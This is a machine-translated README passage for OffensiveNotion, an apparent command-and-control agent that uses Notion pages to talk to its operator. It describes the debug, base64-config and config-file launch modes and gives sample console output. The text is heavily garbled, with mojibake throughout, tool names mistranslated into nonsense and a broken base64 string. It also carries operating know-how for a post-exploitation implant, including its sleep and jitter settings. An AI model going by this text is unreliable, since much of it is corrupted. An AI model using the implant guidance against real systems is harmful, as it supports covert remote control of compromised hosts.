å¦‚æœä»£ç†æ²¡æœ‰ä½¿ç”¨ç¼ºçœå‚æ•°å€¼è¿›è¡Œç¼–è¯‘ï¼Œå®ƒå°†å°è¯•åœ¨å½“å‰å·¥ä½œç›®å½•ä¸­å®šä½`cfg.json`ã€‚å¦‚æœè¯¥æ–‡ä»¶å­˜åœ¨ï¼Œå®ƒå°†ä½¿ç”¨è¿™äº›å‚æ•°è¿è¡Œã€‚

å¦‚æœåœ¨è¿™ç§æƒ…å†µä¸‹æ²¡æœ‰å¯ç”¨çš„`**cfg.json**`æ–‡ä»¶ï¼Œä»£ç†å°†é€€å‡ºè€Œä¸å»ºç«‹è¿æ¥ã€‚

### `**-d**`:è°ƒè¯•æ¨¡å¼ã€‚

å…è®¸æ‚¨é€šè¿‡ CLI è¾“å…¥æ¯ä¸ªä»£ç†å‚æ•°ã€‚å»ºè®®ç”¨äºè°ƒè¯•å’Œæµ‹è¯•ã€‚ä¸å»ºè®®ç”¨äºæ‰‹æœ¯ã€‚

ç¤ºä¾‹:

**$ã€‚/offensive _ opinion-d
[*]é¦–å‘ï¼æ­£åœ¨è·å–é…ç½®é€‰é¡¹ï¼[* ]è¾“å…¥ä»£ç†ç¡çœ é—´éš”> 5
[ *]è¾“å…¥ä»£ç†æŠ–åŠ¨æ—¶é—´>3*]è¾“å…¥çˆ¶é¡µé¢ id > [â€¦ã€‚çˆ¶é¡µé¢ IDâ€¦]
[ *]è¾“å…¥ API Key > [â€¦API keyâ€¦] [* ]è¾“å…¥é…ç½®æ–‡ä»¶è·¯å¾„>
[*]è¾“å…¥æ—¥å¿—çº§åˆ«(1-4)>
5
[+]Admin context:false
[+]Hostname:Ubuntu
[ï¼Ÿ]é…ç½®é€‰é¡¹:ConfigOptions { sleep_interval: 5ï¼Œjitter_time: 3ï¼Œparent _ page _ ID:â€œ[â€¦çˆ¶é¡µé¢ IDâ€¦]â€ï¼ŒAPI _ key:â€œ[â€¦API keyâ€¦]â€ï¼Œconfig_file_path:â€œâ€ï¼Œlaunch_app: falseï¼Œlog_level: 5 }
[+]åˆ›å»ºé¡µé¢â€¦
[+] zzzZZZzzz: 5 ç§’**

### `-b` : Base64 ç¼–ç é…ç½®

å…è®¸åœ¨æ‰§è¡Œæ—¶ä¼ é€’ base64 ç¼–ç ç‰ˆæœ¬çš„é…ç½®é€‰é¡¹ã€‚

ç¤ºä¾‹:

**ç¾å…ƒã€‚/è¿›æ”» _ æ¦‚å¿µ-b eyjzgvlcf 9 pbnrlchbci 6 NSW amol 0 dgvyx 3 rpbuwuyusiomnbhcmvudf 9 wywdlx 2 lkijoiwy 4 uli 4 gcgfyzw 50 ihbhz 2 adiiwxbpx 2 tlsi 6 ilsuli 4 UC 2 vjcmv 0 igtles 4 null 0 ilcjjjb 25 mawdfzmlz 9 wyxriojoiy 2 zlmpzb 24 ilcjsyxvuy 2 hfyy
[+]ç®¡ç†ä¸Šä¸‹æ–‡:false
[+]ä¸»æœºå:ubuntu
[ï¼Ÿ]é…ç½®é€‰é¡¹:é…ç½®é€‰é¡¹{ sleep_interval: 5ï¼Œjitter_time: 3ï¼Œparent _ page _ id:"[â€¦]parent page idâ€¦]ï¼ŒAPI _ key:"[â€¦. API keyâ€¦]"ï¼Œconfig_file_path:" "ï¼Œlaunch_app: falseï¼Œlog _ level:5]t5 "[+]creating pageâ€¦
zzzzzzzzzz:T7]5 ç§’**

### `-c`:é…ç½®æ–‡ä»¶

å°†é…ç½®æ–‡ä»¶è·¯å¾„ä¼ é€’ç»™ä»£ç†ä»¥è·å–é…ç½®ã€‚

ç¤ºä¾‹:

**$ cat CFG . JSON
{ " sleep _ interval ":5ï¼Œ" jitter_time":3ï¼Œ" parent _ page _ ID ":"[â€¦parent page IDâ€¦]"" APi _ key ":"[â€¦APi keyâ€¦]"" config _ file _ path ":" CFG . JSON "ï¼Œ" launch_app":falseï¼Œ" log_level":5}
$ã€‚/offensive _ incidence-c CFG . JSON
[*]é¦–å‘ï¼
Object({ " API _ key ":String([â€¦ã€‚API å¯†é’¥â€¦..])"ã€" config _ file _ path ":String(" CFG . JSON ")ã€" jitter_time": Number(3)ã€" launch_app": Bool(false)ã€" log_level": Number(5)ã€" parent _ page _ ID ":String("[â€¦parent page IDâ€¦]")ã€" sleep _ interval ":Number(5)})
[+]Admin context:false
[+]Hostname:Ubuntu
[ï¼Ÿ]é…ç½®é€‰é¡¹:ConfigOptions { sleep_interval: 5ï¼Œjitter_time: 3ï¼Œparent _ page _ ID:â€œ[â€¦çˆ¶é¡µé¢ IDâ€¦]â€ï¼ŒAPI _ key:â€œ[â€¦API keyâ€¦]"ï¼Œconfig_file_path: "cfg.json "ï¼Œlaunch_app: falseï¼Œlog_level: 5 }
[+]åˆ›å»ºé¡µé¢â€¦
[+] zzzZZZzzz: 5 ç§’**

[Download](https://github.com/mttaggart/OffensiveNotion)